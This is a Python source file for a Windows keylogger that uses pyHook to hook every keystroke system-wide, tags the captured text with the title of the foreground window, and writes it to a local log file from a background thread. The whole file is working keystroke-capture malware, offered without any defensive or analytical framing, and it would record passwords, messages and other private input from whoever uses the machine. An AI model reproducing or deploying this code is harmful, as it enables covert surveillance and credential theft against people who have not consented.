import pythoncom, pyHook, threading
#This allow us to capture de windows name where the key is pressed
from win32gui import GetWindowText, GetForegroundWindow

'''Global variables'''
lastWindow = GetWindowText(GetForegroundWindow())
auxWindow = None
#list that save the keystrokes
mainList = []
#this list will be a copy of mainList when we set the signal to write in to the log file 
auxList = []
#path of the log file
dirLog = 'log.txt'

#This is the core function, receives the keystroke event and we can do whatever we want with it
#return true to pass the event to others handlers
def OnKeyboardEvent(event):

	global lastWindow
	global auxWindow
	global auxList
	
	#we will keep this for a while...
	#print ('Ascii:', event.Ascii, chr(event.Ascii))
	#print ('KeyID:', event.KeyID)
	
	#we will write to log file when the user type something in a different window
	window = GetWindowText(GetForegroundWindow())
	if window != lastWindow:
		auxWindow = lastWindow
		lastWindow = window
		#now we have to check if the user typed something
		if len(mainList) > 0:
			auxList = list(mainList)
			mainList.clear()
			#the signal is on! time to write in to the log file!
			print('se envia la senal!')
			e.set()
			
	#put the keystroke in the mainlist
	mainList.append(chr(event.Ascii))	
	#print (mainList)
	
	return True

#Another important function that consist in the main loop that wait's forever
def mainFunction():	
	# create a hook manager
	hm = pyHook.HookManager()
	# watch for all keyboard events
	hm.KeyDown = OnKeyboardEvent
	# set the hook
	hm.HookKeyboard()
	#wait forever
	pythoncom.PumpMessages()
	
#This function wait forever for the signal that tell the program to write in to the log file 
def waiter():
	while True:
		e.wait()
		writer()
		e.clear()

#Function that write in the log file 
def writer():
	global auxList
	f = open(dirLog, 'a')
	f.write('***' + auxWindow + '***')
	f.write('\n')
	aux = ''
	for char in auxList:
		aux = aux + char
	auxList.clear()
	f.write(aux)
	f.write('\n')
	f.close()

'''We will use threads for various things'''
#This is the thread that handle the main function
class mainThread (threading.Thread):
	def __init__(self, threadID, name, counter):
		threading.Thread.__init__(self)
		self.threadID = threadID
		self.name = name
		self.counter = counter
	def run(self):
		print ("Starting " + self.name)
		mainFunction()
#This is the thread that waits for the signal to write in the log file
class waiterThread (threading.Thread):
	def __init__(self, threadID, name, counter):
		threading.Thread.__init__(self)
		self.threadID = threadID
		self.name = name
		self.counter = counter
	def run(self):
		print ("Starting " + self.name)
		waiter()

e = threading.Event()	
		
main = mainThread(1, "mainThread", 1)
wait = waiterThread(2, "waiterThread", 2)

wait.start()
main.start()


